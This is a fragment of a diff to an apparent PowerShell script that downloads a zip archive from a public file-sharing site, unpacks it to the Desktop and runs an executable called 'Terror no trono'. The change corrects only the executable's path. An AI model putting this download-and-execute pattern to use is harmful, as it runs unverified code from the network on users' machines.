@@ -6,4 +6,4 @@ Invoke-WebRequest -Uri "https://filetransfer.io/data-package/eeML0ZKe/download" 
 # Extract the Terror no trono.zip file
 Expand-Archive -Path "$env:USERPROFILE\Desktop\Terror no trono.zip" -DestinationPath "$env:USERPROFILE\Desktop\Terror no trono"
 # Execute the Terror no trono.exe file
-Start-Process -FilePath "$env:USERPROFILE\Desktop\Terror no trono\Terror no trono.exe"
+Start-Process -FilePath "$env:USERPROFILE\Desktop\Terror no trono\Terror no trono\Terror_no_trono.exe"
